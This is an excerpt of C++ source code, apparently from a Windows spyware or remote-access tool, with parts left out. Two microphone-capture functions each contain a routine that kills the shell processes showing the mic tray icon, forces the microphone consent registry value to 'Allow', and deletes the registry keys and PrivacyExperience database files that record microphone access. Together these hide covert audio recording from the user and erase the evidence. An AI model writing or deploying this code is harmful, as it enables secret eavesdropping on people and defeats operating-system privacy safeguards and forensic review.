...
static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, int sampleRate, int bitrate, int channels) {
    ...
    // Clean ALL mic traces: registry + tray icon (Win10)
    auto cleanMicReg = []() {
        // Kill tray indicator processes (Win10 shows mic icon via ShellExperienceHost)
        const wchar_t* indicatorProcs[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
            if (Process32FirstW(snap, &pe)) {
                do {
                    for (auto& t : indicatorProcs) {
        ...
        // 1) HKCU ConsentStore\microphone — main privacy store
        ...
        // 2) HKLM ConsentStore\microphone — machine-wide (shows in Win10 Settings → Privacy)
        const wchar_t* micPathLM = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone";
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, micPathLM);
        hk = nullptr;
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, micPathLM, 0, nullptr, 0, KEY_WRITE, nullptr, &hk, nullptr);
        if (hk) { RegSetValueExW(hk, L"Value", 0, REG_SZ, (const BYTE*)L"Allow", 12); RegCloseKey(hk); }

        // 3) NonPackaged subkey — per-app "Last accessed" timestamps (Win10/11)
        const wchar_t* npPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged";
        RegDeleteTreeW(HKEY_CURRENT_USER, npPath);
        const wchar_t* npPathLM = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged";
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, npPathLM);

        // 4) SensorPermissionState — Win11 "Current use" indicator reset
        const wchar_t* sensorPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SensorPermissionState\\microphone";
        RegDeleteTreeW(HKEY_CURRENT_USER, sensorPath);
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, sensorPath);

        // 5) Privacy database files — Win11 stores access history in SQLite files
        wchar_t localAppData[MAX_PATH] = {};
        if (SHGetFolderPathW(nullptr, 0x001c/*CSIDL_LOCAL_APPDATA*/, nullptr, 0, localAppData) == S_OK) {
...
static void capture_audio_live_stream(int sampleRate, int bitrate, int channels, bool alsoRecord = false, int recordDuration = 300) {
    ...
    // Clean ALL mic traces: registry + tray icon (Win10)
    auto cleanMicReg = []() {
        // Kill tray indicator (ShellExperienceHost shows mic icon on Win10)
        const wchar_t* indicatorProcs[] = { L"ShellExperienceHost.exe", L"StartMenuExperienceHost.exe" };
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
        ...
        RegCreateKeyExW(HKEY_LOCAL_MACHINE, micPathLM, 0, nullptr, 0, KEY_WRITE, nullptr, &hk, nullptr);
        if (hk) { RegSetValueExW(hk, L"Value", 0, REG_SZ, (const BYTE*)L"Allow", 12); RegCloseKey(hk); }
        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged");
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged");
        // Privacy database files
        wchar_t localAppData[MAX_PATH] = {};
        if (SHGetFolderPathW(nullptr, 0x001c, nullptr, 0, localAppData) == S_OK) {
            std::wstring privDir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Privacy";
            const wchar_t* files[] = { L"PrivacyExperience.dat", L"PrivacyExperience.dat-shm", L"PrivacyExperience.dat-wal" };
            for (auto& f : files) DeleteFileW((privDir + L"\\" + f).c_str());
        }
